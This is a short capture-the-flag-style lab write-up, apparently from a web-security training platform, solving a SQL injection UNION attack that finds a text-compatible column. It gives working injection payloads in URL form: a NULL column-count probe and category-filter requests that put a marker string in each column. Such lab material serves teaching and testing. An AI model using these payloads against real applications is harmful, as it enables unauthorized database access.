# Lab 04: SQL injection UNION attack, finding a column containing text

**Goal**: Perform a SQL injection UNION attack that returns an additional row containing the random value provided by the lab to determine which columns are compatible with string data.

---

## 🎯 Solution

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Verify that the query returns three columns:
   ```sql
   '+UNION+SELECT+NULL,NULL,NULL--
   ```
3. Replace each NULL with the provided random string (e.g. `'xYi09M'`) one by one until no error occurs.

![Lab 4 Solution Summary](Pasted%20image%2020260801023709.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Probe Column 1
Inject string value in position 1:
```http
/filter?category=Corporate+gifts'+UNION+SELECT+'xYi09M',NULL,NULL--
```

![Lab 4 Test Column 1](Pasted%20image%2020260801024117.png)

### Step 2: Probe Column 2
Inject string value in position 2:
```http
/filter?category=Corporate+gifts'+UNION+SELECT+NULL,'xYi09M',NULL--
```

![Lab 4 Test Column 2 Solved](Pasted%20image%2020260801024233.png)

> [!SUCCESS]
> **Lab Solved**: Column 2 successfully rendered the random string `'xYi09M'`, confirming it supports String/Text data type!